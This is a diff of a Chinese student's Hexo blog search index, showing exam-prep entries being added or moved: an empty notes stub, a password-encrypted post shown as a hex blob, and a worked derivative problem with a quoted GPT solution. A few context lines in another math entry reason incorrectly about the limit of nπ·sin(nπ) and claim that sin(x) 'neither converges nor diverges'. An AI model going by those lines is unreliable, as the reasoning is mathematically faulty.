-      </categories>
-      <tags>
-        <tag>考研专业课</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>荔枝橙味拱腰觅马糕守</title>
     <url>/2024/09/11/%E8%8D%94%E6%9E%9D%E6%A9%99%E5%91%B3%E6%8B%B1%E8%85%B0%E8%A7%85%E9%A9%AC%E7%B3%95%E5%AE%88/</url>
     <content><![CDATA[本篇文章旨在记录笔者阅读《公钥密码方案构造及安全证明的知识要点和方法论》的学习总结和收获
@@ -8605,6 +8615,19 @@ $Decrypt:(SP,pk,M,CT)\rightarrow M/\perp$，其中，$\perp$ 代表解密失败
       </tags>
   </entry>
   <entry>
+    <title>计算机组成原理学习笔记</title>
+    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[
+
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研专业课</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>计算机网络有手就行诶我手呢</title>
     <url>/2025/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E8%AF%B6%E6%88%91%E6%89%8B%E5%91%A2/</url>
     <content><![CDATA[计算机网络刷题记录
@@ -8872,6 +8895,28 @@ IP首部定长部分为20字节
       </tags>
   </entry>
   <entry>
+    <title>记录_一定要打好基础</title>
+    <url>/2025/05/23/%E8%AE%B0%E5%BD%95-%E4%B8%80%E5%AE%9A%E8%A6%81%E6%89%93%E5%A5%BD%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[
+  7b22b1899bb4d215751e07a80f0d88de76ab04d32e749f01d35ab7ebdd5c2d808c2f40622a3888966f86dd811afea936dc27699529deacbe36adc04875c300c1c3f47dabdfeeaf933095654d24260b732f4cc8d32b361bcc99c18a343783f0bc8efe428615c230ccd67cd5d5b91c6813e1474a024e0375ea1af4a62bb335df23a2e661c91627266b0d02d6c21be114bdd423af57c960abfcb4057a0a02f727cca17282b3071c47a3f21684dc1252bcb2597d3ec6b836ce262dc6bec1dc81abbe6de11c9456667dd964773a941460fe7b17389f05482a2bd20d471bf58449f48d4a362651a6cd7cd2bb4d2b71d5b57f994eb284068c94b5d2b619c3b52fae3f7b257f4a2cd211dce992bf450c211c1bb0ff4ee1e2daab480cd86af265d784229ac01fac35df3348d97ec5b09db934ca795fc61a3e4f2939609dc800957724f7098e70be2425daa77b2642a9838b713d180b3b727337c3b6516d96bc65739629308e5589221b6f4fb90fb6795a1c2d5f045242f62dd8fb4ad9bfea58070ecb3a96c196aa5bbbda5d24283063f72017939dbf6046999f7045625aed9c513bdfcd3602352643507a4d78484f9b4d2d240cb91d868063e793e14f68b7847e04fdb5ddbdcfacdeddcb913a9ad1a0454b562dc4c229fc4603c36fbd325b6c6c69561aa5e681adafa97a9c025f92101b1ed09339978b6b90e004e08cd65a2203b8d1d5436060708df08cee1b88dae1ddb280aad429eb478f52116ddc3185eb94d38f7cb99cdd5e9b9087d8ca94433b6770932e0ccbfe85a126a338fb926de70dff334848ca043d2b201cfdbb9aa45c657f1822e3b160197f7136929efa0e45a1705ee6db
+  
+    
+      
+      
+        Hey, password is required here.
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>一点小思考</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录butterfly+waline单文章访客统计正常但全局不显示解决方案</title>
     <url>/2025/07/11/%E8%AE%B0%E5%BD%95butterfly-waline%E5%8D%95%E6%96%87%E7%AB%A0%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1%E6%AD%A3%E5%B8%B8%E4%BD%86%E5%85%A8%E5%B1%80%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
     <content><![CDATA[前两天配置了butterfly主题博客，昨天想配置访客数统计，但是busuanzi一直出问题，索性配置了waline评论区，因为它附带访客统计功能
@@ -8891,28 +8936,6 @@ IP首部定长部分为20字节
 ]]></content>
       <categories>
         <category>工具与技术使用</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录_一定要打好基础</title>
-    <url>/2025/05/23/%E8%AE%B0%E5%BD%95-%E4%B8%80%E5%AE%9A%E8%A6%81%E6%89%93%E5%A5%BD%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[
-  7b22b1899bb4d215751e07a80f0d88de76ab04d32e749f01d35ab7ebdd5c2d808c2f40622a3888966f86dd811afea936dc27699529deacbe36adc04875c300c1c3f47dabdfeeaf933095654d24260b732f4cc8d32b361bcc99c18a343783f0bc8efe428615c230ccd67cd5d5b91c6813e1474a024e0375ea1af4a62bb335df23a2e661c91627266b0d02d6c21be114bdd423af57c960abfcb4057a0a02f727cca17282b3071c47a3f21684dc1252bcb2597d3ec6b836ce262dc6bec1dc81abbe6de11c9456667dd964773a941460fe7b17389f05482a2bd20d471bf58449f48d4a362651a6cd7cd2bb4d2b71d5b57f994eb284068c94b5d2b619c3b52fae3f7b257f4a2cd211dce992bf450c211c1bb0ff4ee1e2daab480cd86af265d784229ac01fac35df3348d97ec5b09db934ca795fc61a3e4f2939609dc800957724f7098e70be2425daa77b2642a9838b713d180b3b727337c3b6516d96bc65739629308e5589221b6f4fb90fb6795a1c2d5f045242f62dd8fb4ad9bfea58070ecb3a96c196aa5bbbda5d24283063f72017939dbf6046999f7045625aed9c513bdfcd3602352643507a4d78484f9b4d2d240cb91d868063e793e14f68b7847e04fdb5ddbdcfacdeddcb913a9ad1a0454b562dc4c229fc4603c36fbd325b6c6c69561aa5e681adafa97a9c025f92101b1ed09339978b6b90e004e08cd65a2203b8d1d5436060708df08cee1b88dae1ddb280aad429eb478f52116ddc3185eb94d38f7cb99cdd5e9b9087d8ca94433b6770932e0ccbfe85a126a338fb926de70dff334848ca043d2b201cfdbb9aa45c657f1822e3b160197f7136929efa0e45a1705ee6db
-  
-    
-      
-      
-        Hey, password is required here.
-      
-    
-  
-
-]]></content>
-      <categories>
-        <category>一点小思考</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -9024,6 +9047,102 @@ $ npm list --depth=0hexo-site@0.0.0 C:\Users\coper\Desktop\myblog├── hexo-
       </tags>
   </entry>
   <entry>
+    <title>记录一道很有意思的简单考研数学题（奇偶性相关）</title>
+    <url>/2025/10/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%AE%80%E5%8D%95%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98%EF%BC%88%E5%A5%87%E5%81%B6%E6%80%A7%E7%9B%B8%E5%85%B3%EF%BC%89/</url>
+    <content><![CDATA[题目描述：设 $f(x)=\frac{1}{2^x+1},x\in \mathbb{R},$ 则$f^{(100)}(0)=?$（即100阶导数）
+学长听说我学完张宇第一章了，便给了我这道题检验学习成果
+第一章全是极限相关的，但对于这道题，我翻来覆去也没看出哪里和极限相关的
+于是乎只能硬导，企图寻找规律；奈何本人计算能力一般，算了三遍三阶导，每一遍都不一样
+于是乎我去请教学长，得知和奇偶性相关，于是记录一下做法
+简单地：$f(x)=\frac{1}{a^x+1}-\frac12$ 是奇函数，故而求导后是偶函数并且 $-\frac12$ 没了，这
+第一步：化简函数
+写成以 $e$ 为底：$f(x) = \frac{1}{e^{x \ln 2} + 1}$
+第二步：中心对称性
+$f(-x) = \frac{1}{2^{-x} + 1} = \frac{1}{\frac{1}{2^x} + 1} = \frac{2^x}{1 + 2^x}$
+注意到：$f(x) + f(-x) = \frac{1}{1+2^x} + \frac{2^x}{1+2^x} = 1$
+因此：$f(-x) = 1 - f(x)$
+第三步：推导对称性条件对导数的影响
+两边对 (x) 求导：
+
+一阶导：$f’(-x) \cdot (-1) = -f’(x) \implies f’(-x) = f’(x)$所以 (f’(x)) 是偶函数。
+二阶导：对上式再求导：$f’’(-x) \cdot (-1) = f’’(x) \implies f’’(-x) = -f’’(x)$所以 (f’’(x)) 是奇函数。
+
+由此可以推得一般规律：$f^{(n)}(-x) = (-1)^{n+1} f^{(n)}(x)$
+第四步：代入 (x=0)
+令 (x=0)，得到：$f^{(n)}(0) = (-1)^{n+1} f^{(n)}(0)$
+若要使该等式成立：
+
+当 $(-1)^{n+1} = 1$，即 (n) 为奇数时，方程恒成立；
+当 $(-1)^{n+1} = -1$，即 (n) 为偶数时，必须 $f^{(n)}(0)=0$。
+
+第五步：结论
+因为 (100) 是偶数：
+
+\boxed{f^{(100)}(0) = 0}
+如果我想直接求导呢？好像确实可以，要用到双曲正切~
+下面的GPT给出的解法，我还没看懂：
+用一点恒等变换就能把“死算导数”变成有规律的公式，既能解释为什么偶数阶导数在 $0$ 为 $0$，也能写出任意奇阶导数的闭式表达（含伯努利数）。步骤和结论如下。
+先把 $2^x$ 写成指数形式并作代换：
+
+f(x)=\frac{1}{1+2^x}=\frac{1}{1+e^{ax}},\qquad a=\ln 2.利用双曲正切的恒等式
+
+\frac{1}{1+e^{y}}=\frac{1-\tanh\frac{y}{2}}{2},令 $y=ax$ 得
+
+f(x)=\frac{1}{2}-\frac{1}{2}\tanh\!\left(\frac{a}{2}x\right).记 $b=\frac{a}{2}=\frac{\ln 2}{2}$。于是
+
+f(x)=\frac{1}{2}-\frac{1}{2}\tanh(bx).由此得到两个直接结论：
+
+$\tanh(z)$ 是奇函数，故其泰勒展开只含奇次幂，说明所有偶阶导数在 $0$ 处为 $0$。因此对原函数：
+
+f^{(2m)}(0)=0\quad(m\ge1).这直接解释了为什么 $f^{(100)}(0)=0$。
+
+对奇阶导数，利用链式法则
+
+\frac{d^n}{dx^n}\tanh(bx)\bigg|_{x=0}=b^n\cdot \tanh^{(n)}(0),以及 $f^{(n)}(0)=-\frac{1}{2}$ 倍该值，可得奇阶的通项公式。
+
+
+
+奇阶导数的闭式（含伯努利数）已知泰勒展开（关于 $x$）：
+
+\tanh x=\sum_{k=1}^{\infty}\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}\,x^{2k-1},其中 $B_{2k}$ 是伯努利数。由此得到对 $n=2k-1$（奇数）
+
+\tanh^{(2k-1)}(0)= (2k-1)!\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}
+=\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k}.因此对 $f$：
+
+\boxed{f^{(2k-1)}(0)=-\frac{1}{2}\,b^{2k-1}\,\tanh^{(2k-1)}(0)
+=-\frac{1}{2}\,b^{2k-1}\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k},}稍整理可写成
+
+\boxed{f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\;b^{2k-1},}
+\quad\text{其中 }b=\frac{\ln2}{2}.
+验证前几项（直观感受规律）从已知的 $\tanh$ 展开：$\tanh x= x-\frac{x^3}{3}+\frac{2x^5}{15}-\frac{17x^7}{315}+\cdots$。
+
+$k=1$（一阶导）：$\tanh’(0)=1$，
+
+f'(0)=-\tfrac{1}{2} b\cdot 1=-\frac{b}{2}=-\frac{\ln2}{4}.
+$k=2$（三阶导）：$\tanh^{(3)}(0)=-2$（因为系数 $-1/3$ 对应 $3!(-1/3)=-2$），
+
+f^{(3)}(0)=-\tfrac{1}{2} b^{3}(-2)=b^{3}=\left(\frac{\ln 2}{2}\right)^3.
+$k=3$（五阶导）：系数 $2/15$ 对应 $\tanh^{(5)}(0)=16$，
+
+f^{(5)}(0)=-\tfrac{1}{2} b^5\cdot 16=-8\,b^5.
+
+
+总结
+偶数阶导数在 $0$ 都为 $0$（所以 $f^{(100)}(0)=0$）。
+
+奇数阶导数有明确闭式，且可用伯努利数写出通项：
+
+f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\left(\frac{\ln2}{2}\right)^{2k-1}.
+
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研数学</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记录一道泰勒公式相关的考研数学题</title>
     <url>/2024/09/15/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F%E7%9B%B8%E5%85%B3%E7%9A%84%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98/</url>
     <content><![CDATA[今天，有个学长（烤盐糕守）发给了我一道树穴题（据说是刚出锅的热乎题）
@@ -9127,102 +9246,6 @@ $ npm list --depth=0hexo-site@0.0.0 C:\Users\coper\Desktop\myblog├── hexo-
 如果 $n$ 是非整数实数，$\sin(n \pi)$ 会在 $[-1, 1]$ 之间振荡。而由于 $n \pi$ 趋向无穷大，乘积 $n \pi \sin(n \pi)$ 是一个无穷大乘以振荡的值，无法直接确定这个极限。
 因此，严格来说，$\lim_{n \to \infty} n \pi \sin(n \pi)$ 是发散的，并不存在一个简单的极限值。如果我们只考虑 $n$ 为整数的情况，则结果为 $0$，否则该极限无法求出。
  $\lim_{n \to \infty} n \pi \sin(n \pi)$ 存在，当且仅当 $\lim_{x \to \infty} \sin(x)$ 存在；众所周知的，$f(x)=\sin(x)$ 既不收敛也不发散（在讨论整个序列时，极限存在与收敛实际上是等价的），故极限不存在
-]]></content>
-      <categories>
-        <category>考研</category>
-      </categories>
-      <tags>
-        <tag>考研数学</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录一道很有意思的简单考研数学题（奇偶性相关）</title>
-    <url>/2025/10/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%AE%80%E5%8D%95%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98%EF%BC%88%E5%A5%87%E5%81%B6%E6%80%A7%E7%9B%B8%E5%85%B3%EF%BC%89/</url>
-    <content><![CDATA[题目描述：设 $f(x)=\frac{1}{2^x+1},x\in \mathbb{R},$ 则$f^{(100)}(0)=?$（即100阶导数）
-学长听说我学完张宇第一章了，便给了我这道题检验学习成果
-第一章全是极限相关的，但对于这道题，我翻来覆去也没看出哪里和极限相关的
-于是乎只能硬导，企图寻找规律；奈何本人计算能力一般，算了三遍三阶导，每一遍都不一样
-于是乎我去请教学长，得知和奇偶性相关，于是记录一下做法
-简单地：$f(x)=\frac{1}{a^x+1}-\frac12$ 是奇函数，故而求导后是偶函数并且 $-\frac12$ 没了，这
-第一步：化简函数
-写成以 $e$ 为底：$f(x) = \frac{1}{e^{x \ln 2} + 1}$
-第二步：中心对称性
-$f(-x) = \frac{1}{2^{-x} + 1} = \frac{1}{\frac{1}{2^x} + 1} = \frac{2^x}{1 + 2^x}$
-注意到：$f(x) + f(-x) = \frac{1}{1+2^x} + \frac{2^x}{1+2^x} = 1$
-因此：$f(-x) = 1 - f(x)$
-第三步：推导对称性条件对导数的影响
-两边对 (x) 求导：
-
-一阶导：$f’(-x) \cdot (-1) = -f’(x) \implies f’(-x) = f’(x)$所以 (f’(x)) 是偶函数。
-二阶导：对上式再求导：$f’’(-x) \cdot (-1) = f’’(x) \implies f’’(-x) = -f’’(x)$所以 (f’’(x)) 是奇函数。
-
-由此可以推得一般规律：$f^{(n)}(-x) = (-1)^{n+1} f^{(n)}(x)$
-第四步：代入 (x=0)
-令 (x=0)，得到：$f^{(n)}(0) = (-1)^{n+1} f^{(n)}(0)$
-若要使该等式成立：
-
-当 $(-1)^{n+1} = 1$，即 (n) 为奇数时，方程恒成立；
-当 $(-1)^{n+1} = -1$，即 (n) 为偶数时，必须 $f^{(n)}(0)=0$。
-
-第五步：结论
-因为 (100) 是偶数：
-
-\boxed{f^{(100)}(0) = 0}
-如果我想直接求导呢？好像确实可以，要用到双曲正切~
-下面的GPT给出的解法，我还没看懂：
-用一点恒等变换就能把“死算导数”变成有规律的公式，既能解释为什么偶数阶导数在 $0$ 为 $0$，也能写出任意奇阶导数的闭式表达（含伯努利数）。步骤和结论如下。
-先把 $2^x$ 写成指数形式并作代换：
-
-f(x)=\frac{1}{1+2^x}=\frac{1}{1+e^{ax}},\qquad a=\ln 2.利用双曲正切的恒等式
-
-\frac{1}{1+e^{y}}=\frac{1-\tanh\frac{y}{2}}{2},令 $y=ax$ 得
-
-f(x)=\frac{1}{2}-\frac{1}{2}\tanh\!\left(\frac{a}{2}x\right).记 $b=\frac{a}{2}=\frac{\ln 2}{2}$。于是
-
-f(x)=\frac{1}{2}-\frac{1}{2}\tanh(bx).由此得到两个直接结论：
-
-$\tanh(z)$ 是奇函数，故其泰勒展开只含奇次幂，说明所有偶阶导数在 $0$ 处为 $0$。因此对原函数：
-
-f^{(2m)}(0)=0\quad(m\ge1).这直接解释了为什么 $f^{(100)}(0)=0$。
-
-对奇阶导数，利用链式法则
-
-\frac{d^n}{dx^n}\tanh(bx)\bigg|_{x=0}=b^n\cdot \tanh^{(n)}(0),以及 $f^{(n)}(0)=-\frac{1}{2}$ 倍该值，可得奇阶的通项公式。
-
-
-
-奇阶导数的闭式（含伯努利数）已知泰勒展开（关于 $x$）：
-
-\tanh x=\sum_{k=1}^{\infty}\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}\,x^{2k-1},其中 $B_{2k}$ 是伯努利数。由此得到对 $n=2k-1$（奇数）
-
-\tanh^{(2k-1)}(0)= (2k-1)!\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}
-=\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k}.因此对 $f$：
-
-\boxed{f^{(2k-1)}(0)=-\frac{1}{2}\,b^{2k-1}\,\tanh^{(2k-1)}(0)
-=-\frac{1}{2}\,b^{2k-1}\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k},}稍整理可写成
-
-\boxed{f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\;b^{2k-1},}
-\quad\text{其中 }b=\frac{\ln2}{2}.
-验证前几项（直观感受规律）从已知的 $\tanh$ 展开：$\tanh x= x-\frac{x^3}{3}+\frac{2x^5}{15}-\frac{17x^7}{315}+\cdots$。
-
-$k=1$（一阶导）：$\tanh’(0)=1$，
-
-f'(0)=-\tfrac{1}{2} b\cdot 1=-\frac{b}{2}=-\frac{\ln2}{4}.
-$k=2$（三阶导）：$\tanh^{(3)}(0)=-2$（因为系数 $-1/3$ 对应 $3!(-1/3)=-2$），
-
-f^{(3)}(0)=-\tfrac{1}{2} b^{3}(-2)=b^{3}=\left(\frac{\ln 2}{2}\right)^3.
-$k=3$（五阶导）：系数 $2/15$ 对应 $\tanh^{(5)}(0)=16$，
-
-f^{(5)}(0)=-\tfrac{1}{2} b^5\cdot 16=-8\,b^5.
-
-
-总结
-偶数阶导数在 $0$ 都为 $0$（所以 $f^{(100)}(0)=0$）。
-
-奇数阶导数有明确闭式，且可用伯努利数写出通项：
-
-f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\left(\frac{\ln2}{2}\right)^{2k-1}.
-
 ]]></content>
       <categories>
         <category>考研</category>
